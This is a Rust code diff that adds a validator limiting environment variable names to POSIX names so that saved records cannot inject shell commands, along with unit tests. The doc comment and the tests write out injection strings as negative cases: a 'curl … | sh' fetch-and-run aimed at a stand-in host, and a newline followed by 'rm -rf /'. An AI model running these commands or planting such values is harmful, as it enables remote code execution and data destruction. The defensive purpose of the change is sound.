@@ -281,7 +281,7 @@ fn call_inner(method: &str, params: &str) -> Result<Value, String> {
             }
             for pair in &item.env {
                 required(&pair.name, "environment name")?;
-                validate_shell_text(&pair.name, "environment name")?;
+                validate_env_name(&pair.name)?;
                 validate_shell_text(&pair.value, "environment value")?;
             }
             if let Some(folder) = &item.folder_id
@@ -553,6 +553,25 @@ pub(crate) fn validate_shell_text(value: &str, field: &str) -> Result<(), String
         Err(format!("{field} cannot contain a newline"))
     } else {
         Ok(())
+    }
+}
+
+/// An environment variable name, checked as a name rather than as text.
+///
+/// The value reaches the shell single-quoted, so it cannot escape. The name
+/// cannot be quoted, because `export 'A'=1` is not the same statement, so it
+/// has to be a POSIX name or nothing: `export x; curl evil | sh='v'` is a
+/// command, and a saved record must never be able to become one.
+pub(crate) fn validate_env_name(value: &str) -> Result<(), String> {
+    let mut chars = value.chars();
+    let valid = matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
+        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_');
+    if valid {
+        Ok(())
+    } else {
+        Err(format!(
+            "{value} is not a variable name: letters, digits and underscore only, not starting with a digit"
+        ))
     }
 }
 
@@ -969,7 +988,19 @@ Host db
 
     #[test]
     fn environment_values_cannot_smuggle_a_newline() {
-        assert!(validate_shell_text("TERM", "environment name").is_ok());
+        assert!(validate_shell_text("xterm-256color", "environment value").is_ok());
         assert!(validate_shell_text("x\nrm -rf /", "environment value").is_err());
+    }
+
+    #[test]
+    fn an_environment_name_must_be_a_name() {
+        assert!(validate_env_name("TERM").is_ok());
+        assert!(validate_env_name("_private1").is_ok());
+        // The value is quoted on its way to the shell and the name cannot be,
+        // so anything that is not a name is a command waiting to run.
+        assert!(validate_env_name("x; curl http://example.test | sh").is_err());
+        assert!(validate_env_name("1TERM").is_err());
+        assert!(validate_env_name("TE RM").is_err());
+        assert!(validate_env_name("").is_err());
     }
 }
